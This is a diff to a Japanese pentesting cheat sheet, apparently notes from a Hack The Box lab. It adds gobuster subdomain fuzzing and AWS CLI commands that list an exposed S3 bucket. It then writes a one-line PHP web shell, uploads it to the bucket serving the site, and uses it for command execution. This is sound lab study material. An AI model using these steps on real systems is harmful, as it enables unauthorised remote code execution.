@@ -21,6 +21,8 @@
   - [Evil-WinRM](#evil-winrm)
   - [John The Ripper](#john-the-ripper)
   - [Responder](#responder)
+  - [AWS CLI](#aws-cli)
+    - [s3](#s3)
 - [テンプレート](#テンプレート)
   - [SQL Injection](#sql-injection)
   - [MySQL](#mysql)
@@ -63,17 +65,23 @@
   - Windows標準の通信規約 ファイル共有やプリンタ共有
   - ポート番号: 445
   - [smbclient](#smbclient)
+- s3
+  - amazon s3
+  - クラウドストレージ
+  - [s3](#s3)
 
 ## Web
 
 - gobuster
   - ウェブのディレクトリやファイルを見つけるためにブルートフォースアタック
+  - サブドメイン探し
+  - ファジング
   - [gobuster](#gobuster)
 - responder
   - RFI(Remote File Include)攻撃
   - NTLM認証(チャレンジ/レスポンスメカニズム)を使っているときに使用
   - ハッシュ値を取得してJohn The Ripperで解析する
-  - 
+  - [Responder](#responder)
 
 ## Database
 
@@ -157,6 +165,12 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Logins.fuzz.txt -u <ho
 # -xは拡張子指定
 ```
 
+サブドメインさがし
+
+```bash
+gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<ドメイン>
+```
+
 ### SecList
 
 パスワードリスト
@@ -238,6 +252,44 @@ Hash値は以下のフォルダに保存してある
 
 ```
 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.222.txt
+```
+
+## AWS CLI
+
+設定
+```bash
+aws configure
+```
+
+### s3
+
+s3内のフォルダリスト表示 多分ルート？
+
+```bash
+└──╼ $aws --endpoint=http://<ドメイン名> s3 ls
+2024-07-31 00:30:50 thetoppers.htb
+```
+
+thetoppers.htbフォルダの中のリスト表示
+
+```bash
+└──╼ $aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+                           PRE images/
+2024-07-31 00:30:50          0 .htaccess
+2024-07-31 00:30:50      11952 index.php
+```
+
+上記がWebページに表示しているフォルダが入っていることがわかる
+
+OSコマンドを実行できるようなphpファイルを用意し、s3にアップロードする
+
+自由にコマンドが実行できるようになる``http://thetoppers.htb/shell.php?cmd=<コマンド>``
+
+```bash
+└──╼ $echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+└──╼ $aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php     
 ```
 
 # テンプレート
